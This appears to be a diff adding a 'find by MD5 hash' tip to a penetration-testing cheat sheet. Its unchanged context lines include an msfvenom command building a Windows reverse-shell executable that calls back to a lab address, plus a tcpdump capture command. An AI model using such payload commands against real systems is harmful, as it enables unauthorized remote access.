@@ -100,3 +100,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.48.2 LPORT=443 -f exe > wind
 
 ### Tcpdump
 sudo tcpdump -i any -w file.pcap
+
+### Find
+find /usr -type f -exec md5sum {} + | grep "d61d579501ab8ff507120780191929d5"
+> find only files under usr with hash value d61----
